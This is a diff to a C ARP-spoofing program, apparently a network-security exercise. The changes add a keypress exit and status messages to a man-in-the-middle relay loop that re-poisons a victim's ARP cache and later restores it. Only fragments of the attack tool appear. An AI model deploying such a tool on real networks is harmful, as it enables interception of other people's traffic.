@@ -6,7 +6,7 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
-
+#include "kbhit.h"
 #pragma pack(push, 1)
 typedef struct ARP_Packet{
     Ether eth;
@@ -148,8 +148,11 @@ void re_infect(Ether * eth, pcap_t* handle, pcap_pkthdr *header, const u_char* d
 }
 
 void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, uint8_t *gateway_mac, uint32_t gateway_ip, uint32_t victim_ip){
-
+    init_keyboard();
     while(true){
+        if(_kbhit()){
+            break;
+        }
         struct pcap_pkthdr* header;
         const u_char* data;
         int res = pcap_next_ex(handle, &header, &data);
@@ -173,6 +176,7 @@ void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, ui
                 re_infect(eth, handle,header, data, victim_mac, attacker_mac, gateway_mac, gateway_ip, victim_ip);
             }
         }
+        printf("Relaying....\n");
     }
 }
 
@@ -238,7 +242,8 @@ int main(int argc, char* argv[]){
     send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
 
     packet_relay(handle,attacker_mac,victim_mac,gateway_mac,gateway_ip,victim_ip);
+    printf("Finish pcaket relaying\n");
     arp_recover(handle,victim_mac,attacker_mac,gateway_mac,gateway_ip,victim_ip);
-
+    printf("Recover victim's ARP table\n");
     return 0;
 }
